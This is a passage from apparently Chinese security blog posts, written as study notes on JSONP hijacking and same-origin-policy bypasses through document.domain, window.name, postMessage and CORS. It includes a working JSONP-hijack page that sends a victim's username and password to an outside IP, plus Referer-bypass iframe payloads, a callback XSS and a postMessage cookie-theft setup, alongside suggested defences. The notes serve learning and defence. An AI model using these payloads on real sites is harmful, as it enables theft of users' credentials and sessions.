<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wooyun</span>(<span class="params">v</span>)</span>&#123;</span><br><span class="line">    alert(v.username);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">&lt;script src="http:/</span><span class="regexp">/js.login.360.cn/</span>?o=sso&amp;m=info&amp;func=wooyun<span class="string">"&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是在乌云网上报告的一个攻击例子（ WooYun-2012-11284 ）<a href="http://www.wooyun.org/bug.php?action=view&amp;id=11284" target="_blank" rel="noopener">http://www.wooyun.org/bug.php?action=view&amp;id=11284</a> 当被攻击者在登陆 360 网站的情况下访问了该网页时，那么用户的隐私数据（如用户名，邮箱等）可能被攻击者劫持。<strong>也就是当用户点击此链接，则会触发我们构造wooyun函数，进行返回用户的json数据并且显示出来。</strong></p>
<p>也可以使用jQuery调用jsonp，payload如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;    </span><br><span class="line">    $.getJSON(<span class="string">"http://xxx/xxx?callback=?"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">getUsers</span>)</span>&#123;</span><br><span class="line">          alert(getUsers.name);</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>模拟场景实战：</p>
<p>test.php(储存着用户的数据)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line">$jsoncallback = htmlspecialchars($_REQUEST [<span class="string">'callback'</span>]);<span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="comment">//$json_data = '["id","user"]';</span></span><br><span class="line">$json_data=<span class="string">'(&#123;"password":"123456","name":"lihuaiqiu"&#125;)'</span>;</span><br><span class="line"><span class="keyword">echo</span> $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;<span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>json.html恶意链接模仿用户点击</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">​        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">callbackFunction</span><span class="params">(result)</span></span></span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> password=result.password;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> username=result.name;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> xhttp;</span></span><br><span class="line"><span class="actionscript">            xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">            xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">             <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">           <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="keyword">this</span>.responseText;</span></span><br><span class="line">    &#125;&#125;;</span><br><span class="line"><span class="actionscript">    xhttp.open(<span class="string">"GET"</span>,<span class="string">"http://120.77.174.89:12333/?username="</span>+username+<span class="string">"&amp;password="</span>+password,<span class="literal">true</span>);</span></span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://139.224.236.99/test.php?callback=callbackFunction"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>本地nc监听</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZxrmsP.png" alt="ZxrmsP.png"></p>
<p>成功拿到数据。</p>
<p>其实如果只是用来漏洞验证的话，完全可以直接写一个回调函数将数据alert出来。</p>
<h4 id="JSONP劫持的挖掘手法"><a href="#JSONP劫持的挖掘手法" class="headerlink" title="JSONP劫持的挖掘手法"></a>JSONP劫持的挖掘手法</h4><p>既然知道的JSONP劫持的作用，该怎么去挖掘这种类型漏洞，这里是在圆圆师傅博客学到的在挖掘微博的JSONP劫持的思路，在他的博客中是以微博为例子的，可能是因为我菜吧…，并没有找到这个接口，于是我在腾讯视频亲爱的热爱的这部电视剧去试着寻找了一下，找到了两处，其中有一处是jQuery的调用，不过都没有敏感信息的涉及，跟着分析一下这两处的调用。</p>
<p>全局搜索callback</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzAqTH.png" alt="ZzAqTH.png"></p>
<p>跟进_user0函数</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzZOk4.png" alt="ZzZOk4.png"></p>
<p>跟着仔细看一下callback的json数据</p>
<p><img src="https://s2.ax1x.com/2019/07/20/Zzm7oF.png" alt="Zzm7oF.png"></p>
<p>但是这个JSON数据并不涉及一些敏感数据，但是如果我们测试出来了一些敏感信息如(<code>csrf_token,email之类的</code>)的话，接下来就可以换不同的Referer去尝试访问此链接，如果能成的话，就可以构造JSONP劫持去得到敏感信息，如上文的脚本。从这个过程来看，jsonp劫持这个名字似乎起的很恰当，本来应该是正常的网页通过函数回调来取得一些JSON数据进行一些操作，但是在没有安全验证的情况(指Referer一些的验证)，我们可以通过自己构造好的脚本来劫持掉传输的JSON的数据，所以成为JSONP劫持。</p>
<h5 id="referer的绕过手段"><a href="#referer的绕过手段" class="headerlink" title="referer的绕过手段"></a>referer的绕过手段</h5><ul>
<li>正则设置不当，通过购买适当的域名进行绕过</li>
</ul>
<p>对于<a href="http://www.qq.com/login.php?calback=cb，如果referer中的正则检测的只是域名中是否包含qq.com进行过滤，那么我们完全可以通过http://qq.com.hacker.com/hacker.html这种url进行绕过。" target="_blank" rel="noopener">http://www.qq.com/login.php?calback=cb，如果referer中的正则检测的只是域名中是否包含qq.com进行过滤，那么我们完全可以通过http://qq.com.hacker.com/hacker.html这种url进行绕过。</a></p>
<ul>
<li>空referer绕过</li>
</ul>
<p>在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。实例如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"javascript:'&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;/script&gt;&lt;script src=http://www.qq.com/login.php?calback=JSON&gt;&lt;/script&gt;'"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>调用javascript伪协议实现空referer绕过。</p>
<h4 id="自定义回调函数产生Xss漏洞"><a href="#自定义回调函数产生Xss漏洞" class="headerlink" title="自定义回调函数产生Xss漏洞"></a>自定义回调函数产生Xss漏洞</h4><p>对于如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$jsoncallback = $_REQUEST [<span class="string">'callback'</span>];<span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="comment">//$json_data = '["id","user"]';</span></span><br><span class="line">$json_data=<span class="string">'(&#123;"password":"123456","name":"lihuaiqiu"&#125;)'</span>;</span><br><span class="line"><span class="keyword">echo</span> $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;<span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可成功通过callback造成xss</p>
<p><img src="https://s2.ax1x.com/2019/07/20/ZzuQHK.png" alt="ZzuQHK.png"></p>
<p>防御手段：可以设置Conten-type为application/json或application/javascript，或者把输入的内容进行实体编码。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>jsonp劫持的思路也就是通过搜索callback之类的关键词，或者cb以及jsoncallback之类的，再次搜索调用的函数名，看一下json数据是否包含敏感的数据，如果包含的话，则可以配合不同referer加绕过过滤的方法验证是否存在，其实最好的方法还是通过脚本是FUZZ，找到的话，可以通过自己构造的脚本进行jsonp敏感信息的劫持，如得到csrf_token,可将漏洞进一步扩大化。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/#0X04-JSONP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7" target="_blank" rel="noopener">https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/#0X04-JSONP-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7</a></p>
<p><a href="https://evoa.me/index.php/archives/43/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/43/</a></p>
<p><a href="http://blog.knownsec.com/2015/03/jsonp_security_technic/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/03/jsonp_security_technic/</a></p>
<p><a href="https://www.cnblogs.com/chopper/archive/2012/03/24/2403945.html" target="_blank" rel="noopener">https://www.cnblogs.com/chopper/archive/2012/03/24/2403945.html</a></p>
]]></content>
      <tags>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>前端安全学习笔记(二)-同源跨域产生的安全问题</title>
    <url>/2019/07/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C-%E5%90%8C%E6%BA%90%E8%B7%A8%E5%9F%9F%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="同源问题"><a href="#同源问题" class="headerlink" title="同源问题"></a>同源问题</h3><p>首先引入同源策略这个概念。</p>
<blockquote>
<p><strong>同源策略</strong>（Same origin policy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了<strong>同源策略</strong>，则浏览器的正常功能可能都会受到影响。 可以说Web是构建在<strong>同源策略</strong>基础之上的，浏览器只是针对<strong>同源策略</strong>的一种实现。 <strong>同源策略</strong>，它是由Netscape提出的一个著名的安全<strong>策略</strong>。</p>
</blockquote>
<p>最初，它的含义是指，A网页设置的 Cookie，B网页不能打开，除非这两个网页”同源”。所谓”同源”指的是”三个相同”。</p>
<ul>
<li>协议相同</li>
<li>域名相同</li>
<li>端口相同</li>
</ul>
<p>如下是官方给出的检测案例：</p>
<p><img src="https://s2.ax1x.com/2019/07/18/Zjn6v6.png" alt="Zjn6v6.png"></p>
<h3 id="同源策略的目的"><a href="#同源策略的目的" class="headerlink" title="同源策略的目的"></a>同源策略的目的</h3><p>同源策略的真正目的在于保护用户的安全，防止用户数据被盗取。</p>
<p>如果没有同源策略的存在，那么可能存在如下问题：</p>
<p>当用户浏览了A网站，然后再去浏览B网站，那么B网站就有读取到A网站cookie的可能性，进而冒充用户做一些危害用户安全的事情，所以，可以通过同源策略的限制来达到保护用户安全的目的，使得B网站无法获得A网站的数据。</p>
<h4 id="同源策略的限制范围"><a href="#同源策略的限制范围" class="headerlink" title="同源策略的限制范围"></a>同源策略的限制范围</h4><p>（1） Cookie、LocalStorage 和 IndexDB 无法读取。</p>
<p>（2） DOM 无法获得。</p>
<p>（3） AJAX 请求不能发送。（Fetch请求受到限制)</p>
<p>其实真正意义上来说，AJAX的请求并非不能发送，而是在发送给服务器后，服务器在返回对应数据Respense的过程被浏览器所拦截，达到限制的目的。</p>
<h3 id="规避同源策略的几种方法"><a href="#规避同源策略的几种方法" class="headerlink" title="规避同源策略的几种方法"></a>规避同源策略的几种方法</h3><h4 id="document-domain规避"><a href="#document-domain规避" class="headerlink" title="document.domain规避"></a>document.domain规避</h4><h5 id="cookie跨域获取"><a href="#cookie跨域获取" class="headerlink" title="cookie跨域获取"></a>cookie跨域获取</h5><p>当两个网页一级域名相同，只是二级域名不同，浏览器允许通过设置<code>document.domain</code>共享 Cookie。</p>
<p>如A网页：<code>http://aaa.huaiqiu.com</code> , B网页：<code>http://bbb.huaiqiu.com</code></p>
<p>那么在设置document.domain=<a href="http://www.huaiqiu.com的情况下，如下通过document.cookie给A网页设置了一个cookie：name">http://www.huaiqiu.com的情况下，如下通过document.cookie给A网页设置了一个cookie：name</a>: Hello，那么在B网页就可以通过document.cookie读取到A网页的cookie，达到跨域目的。</p>
<h5 id="iframe跨域获取"><a href="#iframe跨域获取" class="headerlink" title="iframe跨域获取"></a>iframe跨域获取</h5><p><strong>所谓iframe跨域并不是指只通过src属性把所需要的页面拿过来，而是只与拿过来的页面进行数据间的交互。</strong>更具体的例子如下：</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZjjmqK.png" alt="ZjjmqK.png"></p>
<p><strong>在子窗口去调用父窗口的函数来改变自身窗体的大小。</strong></p>
<p>如果两个网页不同源，就无法拿到对方的DOM。典型的例子是<code>iframe</code>窗口和<code>window.open</code>方法打开的窗口，它们与父窗口无法通信。实验一下</p>
<p>在我的vps写入如下语句<code>&lt;iframe id=&#39;1&#39; src=&#39;http://www.baidu.com&#39;&gt;&lt;/iframe&gt;</code>,百度的页面与我的父窗口是不同源的，接下我来我们试着获取windows对象</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZjqV74.png" alt="ZjqV74.png"></p>
<p>可以看到由于同源问题我们没法去获得子窗口的contentwindow属性，子窗口无法获得父窗口的dom，父窗口也无法获得子窗口的dom,对于子窗口而言，<code>window.parent.document</code>同样因为同源问题报错,那么只要这两个窗口一级域名一样，二级域名不同，同样可以通过设置document.domain来使得两个页面同源，进而操作dom属性。同样也会产生一些安全问题，如果在页面存在xss漏洞，那么可以威胁到其他设置了document.domain的页面甚至父域。</p>
<p><img src="https://s2.ax1x.com/2019/07/19/Zjq6EQ.png" alt="Zjq6EQ.png"></p>
<p><strong>也就是说如果通过iframe这种方式来引入其他子窗口，那么在设置了document.domain的情况下，很可能实现”跨域攻击”。</strong></p>
<p>document.domain需要注意的一些事情</p>
<ol>
<li>document.domain只可以设置为当前域以及父域。</li>
<li>document.domain赋值后端口会变成NULL,也就是说a.b.com仅凭document.domain赋值为b.com是无法与b.com进行交互的，因为此时端口仍然不同，还是不同源，这样就能避免了子域存在xss漏洞，而对父域造成攻击的影响，但是还是可以影响到其他子域的，例如上面的例子。</li>
</ol>
<h4 id="location-hash跨域"><a href="#location-hash跨域" class="headerlink" title="location.hash跨域"></a>location.hash跨域</h4><p>实例：利用location.hash实现跨域iframe自适应宽高</p>
<p><a href="https://dj4kobe.iteye.com/blog/842322" target="_blank" rel="noopener">https://dj4kobe.iteye.com/blog/842322</a></p>
<p>主要原理，通过location.hash将数据传给与a.html同域名的的c.html,c.html通过两层parent获取a的windows属性，实现自适应高度，比较容易理解使用。</p>
<h4 id="window-name跨域"><a href="#window-name跨域" class="headerlink" title="window.name跨域"></a>window.name跨域</h4><p>window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。</p>
<p><strong>first_vps/6.html</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">'http://second_vps/2.html'</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">window</span>.name)&lt;<span class="regexp">/scrispt&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>first_vps/5.html</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">alert(<span class="built_in">window</span>.name)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>second_vps/2.html</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="built_in">window</span>.name = <span class="string">"flag&#123;this_is_test&#125;"</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先通过6.html来得到2.html的window.name对象，再通过引入5.html将值打印出。</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvFB7R.png" alt="ZvFB7R.png"></p>
<p><strong>这里的载入过页面也就是只经过src引用的5.html和2.html，所以二者共享一个window.name对象，通过alert可将window.name弹出。</strong></p>
<p>安全性思考：敏感信息不应该放在window.name属性中，因为可以通过如上方式，两个窗口的载入，来共享一个window.name，并且获得其值。</p>
<h4 id="PostMessage跨域"><a href="#PostMessage跨域" class="headerlink" title="PostMessage跨域"></a>PostMessage跨域</h4><p>html5引入的message的API可以更方便、有效、安全的解决这些难题。postMessage()方法允许来自不同源的脚本采用异步方式进行有限的通信，可以实现跨文本档、多窗口、跨域消息传递。</p>
<p>postMessage(data,origin)方法接受两个参数</p>
<p> 1.<strong>data</strong>:要传递的数据，html5规范中提到该参数可以是JavaScript的任意基本类型或可复制的对象，然而并不是所有浏览器都做到了这点儿，部分浏览器只能处理字符串参数，所以我们在传递参数的时候需要使用JSON.stringify()方法对对象参数序列化，在低版本IE中引用json2.js可以实现类似效果。</p>
<p>2.<strong>origin</strong>：字符串参数，指明目标窗口的源，协议+主机+端口号[+URL]，URL会被忽略，所以可以不写，这个参数是为了安全考虑，postMessage()方法只会将message传递给指定窗口，当然如果愿意也可以建参数设置为”*”，这样可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。</p>
<p>实验如下</p>
<p>第一个vps上的2.html开启监听</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">'test'</span> <span class="attr">src</span>=<span class="string">"//your_vps/5.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(e.data);</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二个vps上的5.html传入数据</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    parent.postMessage(<span class="string">'test'</span>,<span class="string">'first_vps/2.html'</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/07/19/ZvVGb4.png" alt="ZvVGb4.png"></p>
<p>成功得到数据，安全性问题(以下例子来自evoA师傅的文章)</p>
<h5 id="事件监听没有判断来源造成的安全问题"><a href="#事件监听没有判断来源造成的安全问题" class="headerlink" title="事件监听没有判断来源造成的安全问题"></a>事件监听没有判断来源造成的安全问题</h5><p>对于如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">"flag"</span>,<span class="string">"flag&#123;this_is_test&#125;"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;iframe id=<span class="string">'iframe'</span> src=<span class="string">"//True_url/5.html"</span>&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 id=<span class="string">"name"</span>&gt;&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    window.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span><span class="params">(e)</span></span>&#123;</span><br><span class="line">        document.getElementById(<span class="string">'name'</span>).innerHTML = e.data;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>对于如上代码，原理是监听True_url下的5.html所发送的数据进行给h1赋值，但是我们可以通过恶意iframe进行引入</p>
<p>创建test.html页面，内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe id&#x3D;&#39;test&#39; src&#x3D;&#39;http:&#x2F;&#x2F;120.77.174.89:10080&#x2F;2.php&#39;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>

<p>即可进行恶意引入xss进行获得管理员cookie等操作</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvQajI.png" alt="ZvQajI.png"></p>
<h5 id="当正则设置有误时，可以通过适当的域名绕过"><a href="#当正则设置有误时，可以通过适当的域名绕过" class="headerlink" title="当正则设置有误时，可以通过适当的域名绕过"></a>当正则设置有误时，可以通过适当的域名绕过</h5><p><img src="https://s2.ax1x.com/2019/07/19/ZvU8sg.png" alt="ZvU8sg.png"></p>
<p>如上是一个简单的过滤样例。</p>
<h4 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h4><p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。它允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="noopener"><code>XMLHttpRequest</code></a>请求，从而克服了AJAX只能<a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="noopener">同源</a>使用的限制。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>
<p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>下面主要说一下<code>simple request</code></p>
<p>简单请求的定义为：</p>
<p>（1) 请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>（2）HTTP的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>
</ul>
<p>满足以上条件的为简单请求，不满足的为非简单请求。</p>
<p>当浏览器发现<code>AJAX</code>请求是简单请求，就会自动在头部信息中，添加一个<code>Origin</code>字段，如下：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/cors</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Origin</span>: http://api.bob.com</span><br><span class="line"><span class="attribute">Host</span>: api.alice.com</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0...</span><br></pre></td></tr></table></figure>

<p>服务器会通过Origin的值来判断此次请求是否在允许的范围内，如果不在允许的范围内，服务器返回一个正常的但是没有Access-Control-Allow-Origin的http请求，浏览器通过检测出错误，然后抛出异常，如果在允许的范围内，则会多出如下几下响应头部字段：</p>
<blockquote>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Access-Control-Allow-Origin</span>: http://api.bob.com</span><br><span class="line"><span class="attribute">Access-Control-Allow-Credentials</span>: true</span><br><span class="line"><span class="attribute">Access-Control-Expose-Headers</span>: FooBar</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=utf-8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><strong>Access-Control-Allow-Origin</strong>:该字段为必须值，*的情况下代表接受任意域名的请求。</li>
<li><strong>Access-Control-Allow-Credentials</strong>:布尔值，代表此次请求是否需要cookie</li>
<li><strong>Access-Control-Expose-Headers</strong>：指定额外的header字段，如果请求想要拿取额外指定的header字段，必须添加此形式getResponseHeader(‘test’)，才可以获得test字段的值</li>
</ul>
<p>进行一次实验</p>
<p>2.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin: *"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You Get it"</span>;</span><br><span class="line"><span class="meta">?&gt;</span>p</span><br></pre></td></tr></table></figure>

<p>test.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"loadDoc()"</span>&gt;</span>修改内容<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">'demo'</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">loadDoc</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">  <span class="keyword">var</span> xhttp = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">  xhttp.onreadystatechange = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML =</span></span><br><span class="line"><span class="actionscript">      <span class="keyword">this</span>.responseText;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="actionscript">  xhttp.open(<span class="string">"GET"</span>, <span class="string">"http://120.77.174.89:10080/2.php"</span>, <span class="literal">true</span>);</span></span><br><span class="line">  xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓包看一下</p>
<p><img src="https://s2.ax1x.com/2019/07/19/ZvcbJe.png" alt="ZvcbJe.png"></p>
<p>成功看到之前我们所说的Origin与服务器返回的字段。</p>
<p><strong>注意，如果要发送cookie，Access-Control-Allow-Origin就不能设置*，必须要与请求网页的域名一致。</strong></p>
<p>同样存在不正确的正则匹配问题，如下代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/http:\/\/.*\.?test.club/"</span>,getallheaders()[<span class="string">'Origin'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    header(<span class="string">"Access-Control-Allow-Origin: "</span>.getallheaders()[<span class="string">'Origin'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

